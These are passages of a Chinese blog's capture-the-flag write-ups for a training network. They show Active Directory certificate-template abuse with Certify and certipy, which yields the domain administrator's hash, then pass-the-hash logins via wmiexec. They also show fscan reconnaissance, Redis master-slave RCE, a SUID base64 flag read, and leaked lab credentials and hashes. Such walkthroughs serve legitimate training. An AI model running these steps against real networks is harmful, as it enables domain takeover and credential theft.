Found 52 groups</span><br><span class="line">INFO: Found 2 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DESKTOP-CBKTVMO.xiaorang.lab</span><br><span class="line">INFO: Querying computer: XIAORANG-DC.xiaorang.lab</span><br><span class="line">INFO: Done in 00M 06S</span><br><span class="line">INFO: Compressing output into 20250416132802_bloodhound.zip</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>上传Certify.exe查找易受攻击的证书</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\chenchen\Desktop\新建文件夹&gt;Certify.exe find /vulnerable</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ &#x27;__| __| |  _| | | |</span><br><span class="line"> | |___|  __/ |  | |_| | | | |_| |</span><br><span class="line">  \_____\___|_|   \__|_|_|  \__, |</span><br><span class="line">                             __/ |</span><br><span class="line">                            |___./</span><br><span class="line">  v1.0.0</span><br><span class="line"></span><br><span class="line">[*] Action: Find certificate templates</span><br><span class="line">[*] Using the search base &#x27;CN=Configuration,DC=xiaorang,DC=lab&#x27;</span><br><span class="line"></span><br><span class="line">[*] Listing info about the Enterprise CA &#x27;xiaorang-XIAORANG-DC-CA&#x27;</span><br><span class="line"></span><br><span class="line">    Enterprise CA Name            : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Hostname                  : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    FullName                      : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span><br><span class="line">    Cert SubjectName              : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Cert Thumbprint               : 37BFD9FE73CA81E18E7A87CEBD90AF267E57170E</span><br><span class="line">    Cert Serial                   : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Cert Start Date               : 2023/7/14 12:33:21</span><br><span class="line">    Cert End Date                 : 2028/7/14 12:43:21</span><br><span class="line">    Cert Chain                    : CN=xiaorang-XIAORANG-DC-CA,DC=xiaorang,DC=lab</span><br><span class="line">    UserSpecifiedSAN              : Disabled</span><br><span class="line">    CA Permissions                :</span><br><span class="line">      Owner: BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line"></span><br><span class="line">      Access Rights                                     Principal</span><br><span class="line"></span><br><span class="line">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span><br><span class="line">      Allow  ManageCA, ManageCertificates               XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">      Allow  ManageCA, ManageCertificates               XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">    Enrollment Agent Restrictions : None</span><br><span class="line"></span><br><span class="line">[!] Vulnerable Certificates Templates :</span><br><span class="line"></span><br><span class="line">    CA Name                               : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Template Name                         : XR Manager</span><br><span class="line">    Schema Version                        : 2</span><br><span class="line">    Validity Period                       : 1 year</span><br><span class="line">    Renewal Period                        : 6 weeks</span><br><span class="line">    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT</span><br><span class="line">    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS</span><br><span class="line">    Authorized Signatures Required        : 0</span><br><span class="line">    pkiextendedkeyusage                   : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class="line">    mspki-certificate-application-policy  : 安全电子邮件, 加密文件系统, 客户端身份验证</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights           : NT AUTHORITY\Authenticated UsersS-1-5-11</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Domain Users         S-1-5-21-990187620-235975882-534697781-513</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                       : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">        WriteOwner Principals       : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">        WriteDacl Principals        : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line">        WriteProperty Principals    : XIAORANG\Administrator        S-1-5-21-990187620-235975882-534697781-500</span><br><span class="line">                                      XIAORANG\Domain Admins        S-1-5-21-990187620-235975882-534697781-512</span><br><span class="line">                                      XIAORANG\Enterprise Admins    S-1-5-21-990187620-235975882-534697781-519</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Certify completed in 00:00:10.1629693</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CA Name                               : XIAORANG-DC.xiaorang.lab\xiaorang-XIAORANG-DC-CA</span><br><span class="line">Template Name                         : XR Manage</span><br></pre></td></tr></table></figure>

<p>这个可以打</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -t</span><br><span class="line">emplate &#x27;XR Manager&#x27;  -upn administrator@xiaorang.lab</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 7</span><br><span class="line">[*] Got certificate with UPN &#x27;administrator@xiaorang.lab&#x27;</span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to &#x27;administrator.pfx&#x27;</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@xiaorang.lab</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;administrator.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;administrator&#x27;</span><br><span class="line">[*] Got hash for &#x27;administrator@xiaorang.lab&#x27;: aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80</span><br></pre></td></tr></table></figure>

<p>得到了administrator的哈希了，拿下域控了，直接登录这台主机和域控拿flag即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-wmiexec  -hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 xiaorang.lab/administrator@172.22.9.7</span><br><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# impacket-wmiexec  --hashes aad3b435b51404eeaad3b435b51404ee:2f1b57eefb2d152196836b0516abea80 administrator@172.22.9.26</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://lvzhouhang.xyz/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="lvzhouhang">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="lvzhouhang">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/04/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road/" class="post-title-link" itemprop="url">春秋云镜-Brute4Road</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-04-15 14:35:35" itemprop="dateCreated datePublished" datetime="2025-04-15T14:35:35+08:00">2025-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-04-17 13:20:17" itemprop="dateModified" datetime="2025-04-17T13:20:17+08:00">2025-04-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" itemprop="url" rel="index"><span itemprop="name">春秋云镜</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="fa fa-file-word-o"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="fa fa-clock-o"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="FLAG1-amp-FLAG2"><a href="#FLAG1-amp-FLAG2" class="headerlink" title="FLAG1&amp;FLAG2"></a>FLAG1&amp;FLAG2</h1><p>先用fscan扫一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# ../pentest/fscan/fscan2 -h 39.99.231.184</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-15 02:37:33] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 最终有效主机数量: 1</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-15 02:37:33] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:6379</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:80</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:21</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 端口开放 39.99.231.184:22</span><br><span class="line">[2025-04-15 02:37:33] [SUCCESS] 服务识别 39.99.231.184:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-04-15 02:37:34] [SUCCESS] 服务识别 39.99.231.184:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-15 02:37:38] [SUCCESS] 服务识别 39.99.231.184:6379 =&gt; [redis] 版本:5.0.12 产品:Redis key-value store</span><br><span class="line">[2025-04-15 02:37:39] [SUCCESS] 服务识别 39.99.231.184:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 存活端口数量: 4</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-15 02:37:43] [INFO] 加载的插件: ftp, redis, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-15 02:37:43] [SUCCESS] 网站标题 http://39.99.231.184      状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-04-15 02:37:44] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-15 02:37:46] [SUCCESS] Redis 39.99.231.184:6379 发现未授权访问 文件位置:/usr/local/redis/db/dump.rdb</span><br><span class="line">[2025-04-15 02:37:50] [SUCCESS] Redis无密码连接成功: 39.99.231.184:6379</span><br><span class="line">[2025-04-15 02:37:53] [SUCCESS] 扫描已完成: 5/5</span><br></pre></td></tr></table></figure>

<p>打redis主从复制rce，flag在/home/redis/flag下，但是没有权限读，base64具有suid权限，可以用base64读取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/base64 ./flag01|/usr/bin/base64 -d</span><br></pre></td></tr></table></figure>

<p>ftp服务只有一个pub文件夹，没什么用，上传fscan扫描一下内网</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">./fscan -h 172.22.2.7/24</span><br><span class="line">┌──────────────────────────────────────────────┐</span><br><span class="line">│    ___                              _        │</span><br><span class="line">│   / _ \     ___  ___ _ __ __ _  ___| | __    │</span><br><span class="line">│  / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /    │</span><br><span class="line">│ / /_\\_____\__ \ (__| | | (_| | (__|   &lt;     │</span><br><span class="line">│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │</span><br><span class="line">└──────────────────────────────────────────────┘</span><br><span class="line">      Fscan Version: 2.0.0</span><br><span class="line"></span><br><span class="line">[2025-04-15 15:22:58] [INFO] 暴力破解线程数: 1</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 开始信息扫描</span><br><span class="line">[2025-04-15 15:22:58] [INFO] CIDR范围: 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 生成IP范围: 172.22.2.0.%!d(string=172.22.2.255) - %!s(MISSING).%!d(MISSING)</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 解析CIDR 172.22.2.7/24 -&gt; IP范围 172.22.2.0-172.22.2.255</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 最终有效主机数量: 256</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 开始主机扫描</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 正在尝试无监听ICMP探测...</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 当前用户权限不足,无法发送ICMP包</span><br><span class="line">[2025-04-15 15:22:58] [INFO] 切换为PING方式探测...</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.3      存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.7      存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.16     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:58] [SUCCESS] 目标 172.22.2.18     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:22:59] [SUCCESS] 目标 172.22.2.34     存活 (ICMP)</span><br><span class="line">[2025-04-15 15:23:04] [INFO] 存活主机数量: 5</span><br><span class="line">[2025-04-15 15:23:04] [INFO] 有效端口数量: 233</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:88</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:80</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:22</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:22</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:21</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:135</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.18:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:445</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.3:389</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.34:139</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.16:1433</span><br><span class="line">[2025-04-15 15:23:04] [SUCCESS] 端口开放 172.22.2.7:6379</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.18:22 =&gt; [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.5 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5.]</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:22 =&gt; [ssh] 版本:7.4 产品:OpenSSH 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.4.]</span><br><span class="line">[2025-04-15 15:23:05] [SUCCESS] 服务识别 172.22.2.7:21 =&gt; [ftp] 版本:3.0.2 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.2).]</span><br><span class="line">[2025-04-15 15:23:09] [SUCCESS] 服务识别 172.22.2.3:88 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:80 =&gt; [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.7:80 =&gt; [http] 版本:1.20.1 产品:nginx</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.18:80 =&gt; [http]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:445 =&gt; </span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.3:389 =&gt; [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.34:139 =&gt;  Banner:[.]</span><br><span class="line">[2025-04-15 15:23:10] [SUCCESS] 服务识别 172.22.2.16:1433 =&gt; [ms-sql-s] 版本:13.00.4001; SP1 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.]</span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:139 =&gt; </span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.18:445 =&gt; </span><br><span class="line">[2025-04-15 15:24:05] [SUCCESS] 服务识别 172.22.2.7:6379 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.34:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.16:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 服务识别 172.22.2.3:135 =&gt; </span><br><span class="line">[2025-04-15 15:24:10] [INFO] 存活端口数量: 21</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 开始漏洞扫描</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 加载的插件: findnet, ftp, ldap, ms17010, mssql, netbios, redis, smb, smb2, smbghost, ssh, webpoc, webtitle</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.34</span><br><span class="line">主机名: CLIENT01</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.34</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.3</span><br><span class="line">主机名: DC</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.3</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetInfo 扫描结果</span><br><span class="line">目标主机: 172.22.2.16</span><br><span class="line">主机名: MSSQLSERVER</span><br><span class="line">发现的网络接口:</span><br><span class="line">   IPv4地址:</span><br><span class="line">      └─ 172.22.2.16</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.3 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.34     XIAORANG\CLIENT01             </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.16        状态码:404 长度:315    标题:Not Found</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 网站标题 http://172.22.2.7         状态码:200 长度:4833   标题:Welcome to CentOS</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.3      DC:DC.xiaorang.lab               Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.16     MSSQLSERVER.xiaorang.lab            Windows Server 2016 Datacenter 14393</span><br><span class="line">[2025-04-15 15:24:10] [INFO] 系统信息 172.22.2.16 [Windows Server 2016 Datacenter 14393]</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] NetBios 172.22.2.18     WORKGROUP\UBUNTU-WEB02        </span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 172.22.2.34 CVE-2020-0796 SmbGhost Vulnerable</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] 匿名登录成功!</span><br><span class="line">[2025-04-15 15:24:10] [SUCCESS] SMB认证成功 172.22.2.18:445 administrator:123456</span><br><span class="line">[2025-04-15 15:24:10] [INFO] SMB2共享信息 172.22.2.18:445 administrator 